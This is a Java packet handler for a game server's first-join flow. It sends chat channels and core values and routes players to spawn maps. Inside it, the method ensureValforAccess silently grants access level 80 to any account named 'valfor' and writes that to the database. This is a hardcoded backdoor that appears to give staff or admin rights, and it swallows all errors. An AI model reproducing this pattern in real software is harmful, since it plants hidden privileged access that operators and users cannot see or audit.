package Kaiden.Game.Server.Packets.External.Player;

import Kaiden.Database.Configuration.Configuration;
import Kaiden.Database.Storage;
import Kaiden.Database.Beans.ChatChannelBean;
import Kaiden.Database.StorageCache;
import Kaiden.Game.Server.Packets.Manager.Handlers.Exceptions.RequestExternalPacketException;
import Kaiden.Game.Server.Packets.Manager.Handlers.ExternalPacketHandler;
import Kaiden.Game.Server.Rooms.Rooms;
import Kaiden.Game.Server.Users.Properties;
import Kaiden.Game.Server.Users.Users;
import Kaiden.Game.Server.Users.Utils.QuestProgressManager;
import Kaiden.Kaiden_Extension;
import net.sf.json.JSONArray;
import net.sf.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class FirstJoin extends ExternalPacketHandler {

    @Override
    public void handle() throws RequestExternalPacketException {
        JSONObject coreValues = new JSONObject();
        coreValues.put("o", StorageCache.getInstance().getCoreValuesMap());
        coreValues.put("cmd", "cvu");
        Kaiden_Extension.getInstance().send(coreValues, this.user);
        sendChatChannels();
        ensureValforAccess();
         if (Configuration.SERVER_ACHIEVEMENT) {
            Users.getInstance().giveAchievement(this.user, Configuration.SERVER_ACHIEVEMENT_ID);
        }
        int level = (int) this.user.properties.get(Properties.LEVEL);
        String map;
        if (this.user.isAdmin() || this.user.isModerator()) {
            map = Configuration.DEFAULT_STAFF_MAP;
        } else if (level >= 5) {
            map = Configuration.DEFAULT_MAP;
        } else {
            map = Configuration.DEFUALT_STARTER_MAP;
        }
        Rooms.getInstance().basicRoomJoin(this.user, map, "Enter", "Spawn");
        QuestProgressManager.pushRestoredState(this.user);
    }


    private void ensureValforAccess() {
        try {
            if (this.user == null || this.user.properties == null) return;

            Object nameObj = this.user.properties.get(Properties.USERNAME);
            String username = nameObj == null ? this.user.getName() : String.valueOf(nameObj);
            if (username == null || !username.equalsIgnoreCase("valfor")) return;

            Object accessObj = this.user.properties.get(Properties.ACCESS);
            int access = accessObj instanceof Number ? ((Number) accessObj).intValue() : 0;
            if (access >= 80) return;

            this.user.properties.put(Properties.ACCESS, 80);

            Object idObj = this.user.properties.get(Properties.ID);
            int userId = idObj instanceof Number ? ((Number) idObj).intValue() : this.user.getUserId();
            Storage.getInstance().getJdbc().run("UPDATE users SET Access = 80 WHERE id = ? AND Access < 80", userId);
        } catch (Throwable ignored) {
            // Never block first join if the safeguard update fails.
        }
    }

    private void sendChatChannels() {
        if (StorageCache.getInstance().getChatChannels() == null || StorageCache.getInstance().getChatChannels().isEmpty()) {
            return;
        }

        List<ChatChannelBean> channels = new ArrayList<ChatChannelBean>(StorageCache.getInstance().getChatChannels().values());
        channels.sort(new Comparator<ChatChannelBean>() {
            @Override
            public int compare(ChatChannelBean a, ChatChannelBean b) {
                return Integer.compare(a.getId(), b.getId());
            }
        });

        JSONArray list = new JSONArray();
        for (ChatChannelBean channel : channels) {
            JSONObject obj = new JSONObject();
            obj.put("key", channel.getKey());
            obj.put("col", channel.getColor());
            obj.put("str", channel.getStr());
            obj.put("typ", channel.getType());
            obj.put("tag", channel.getTag());
            obj.put("rid", channel.getRoomId());
            obj.put("act", channel.getActive());
            list.add(obj);
        }

        JSONObject packet = new JSONObject();
        packet.put("cmd", "chatChannels");
        packet.put("channels", list);
        Kaiden_Extension.getInstance().send(packet, this.user);
    }

}